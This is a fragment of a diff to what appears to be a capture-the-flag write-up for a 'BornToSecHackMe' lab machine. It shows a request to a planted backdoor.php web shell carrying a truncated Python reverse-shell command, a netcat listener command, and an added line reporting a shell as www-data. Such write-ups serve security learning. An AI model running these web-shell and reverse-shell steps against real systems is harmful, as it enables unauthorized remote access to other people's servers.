@@ -122,3 +122,6 @@ https://192.168.1.96/forum/templates_c/backdoor.php?cmd=python+-c+%27import+sock
 but before entering we must start up netcat:
 nc -kl 9001
 
+and we get the access!!:
+www-data@BornToSecHackMe:/var/www/forum/templates_c$
+
